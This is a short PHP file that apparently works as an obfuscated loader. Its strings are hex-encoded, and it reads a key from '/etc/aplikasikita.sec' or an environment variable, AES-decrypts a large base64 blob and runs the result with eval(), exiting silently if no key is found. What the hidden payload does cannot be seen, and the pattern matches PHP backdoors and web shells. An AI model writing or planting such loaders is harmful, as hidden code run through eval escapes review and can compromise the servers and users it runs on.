<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vXTvvB5XvrDwsCjAbOUIWQ==');

$c=base64_decode(

'7/mQPkfm+4Rd79Pin1RMD7A3kjZEaTdDLfv0oVkzRT0zIlZdCTf8mvWBfjoPesxJfG3U2ly08TvD' .
'66taoLj+RxjPv/f3td+bULLzsWlsxfLZcmjdqLtXWw+auJUeNJwNC52xMvEEMQHvjv1SOwrylPFu' .
'iTDQQT79D9TVCK/JK4fVXwJPkhLsLrSLF9u7QEwgJRbkBY8me8gT1g2JIhMBGwro8XzJYm3L7X3i' .
'x4PHBvpkhvMYqyQnEYSYobWc+zCc/MQBOs8ytXwAMJVe0qOGWaAnvSVFDMqWrPRMvVEZdQjH8h3J' .
'w+GXr+HsT/QbhfjMMskD0hpYGGNIPWXFz4CVJlQgZLzKeKZhNKyJ5x3BJNGE7WCO1c5KyjUxdWdF' .
'qgv30RK/wAklpAm8YSLl4pfvHanh2qFivlNTcSEhHfwgEow+yUksKsFsyaeyZ5SY5PalQnEPAIsN' .
'CGd0KInMfPglYkbeNt+aF2vcsCr8to8jC2i5kLHCPNFxvSqhxt1FEJ+cLofD9Z7LaLDIC/VuCH3u' .
'0a3r/LtvN+SIA4Gc+TbYoWzCdUpaE/hZqtNaUBx7yR9o6ie0mQWazeNZ76WUZrLnWIAcxRC7xPeR' .
'yJHrorwEXELc77DMjMADX8wAauFc35iDt79eUVQkO1mRlGKnOMgUyrOykKQU/eg1Zq/0PSZMwTmM' .
'GGRt1rKsquuexcbnPKSzG2azFQjT0PLCjO8phLFxhpMD5mO2o+UaYsQmYhyHSP1k6vz/C3p9qySX' .
'psZIcsJTCGQB85asAQV9T/nfTwrx09fZA/FY1mEXS/bxRZvrtjIgH9MpeHvU8gOK1abd5y0oXt9U' .
'XOp8lrZQ7md0JW2gYjT1z+e1O3kYmbrX3M3dbCM1J9nZZDuj1P0RnHxQ8/otsJWtu3LBz2aS8t7T' .
'QKPLZqbw46Ca7rzk68LFz09O9aN2P7TsIAYlorHvEZ+2cNZ85olYXiwp4GI/Gbi6vhXtsYgRXggo' .
'OxPK66MDxWd5Spgyzq84rsL4jkbKiUVOlmZha5JHHcMBYHoBCeiwvn9pMA/NpEi2DlyQ/1XXPmZN' .
'HsXFYpnau3/EytlSoqbzbMPUp6aWg7/Lb1gOwz/c+gPQoTVOa/ZcsB5N+rzvndVqw8HeYrMQVcGP' .
'wt75UZf/zKjOYsvbQ0TaGuT9DdavquBSk1TGNui9HDfYrMrutkczXIJuZDGRgmPtBfjHW7hkDeXa' .
'd9hszcilAcB6cT3ZEv6iaJfsCIgNqquRt0m0d8sCQKfocgLa/XxibX/e3905Cf8E8Ox8RGp6Y7kg' .
'iRmsXbDDAL6+KUov7ZfCk+nDZQHjVI3JSzoi/4gC7o5V/QQAzJawD/Kuat5rFP3Tw3KAEJ7wvw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

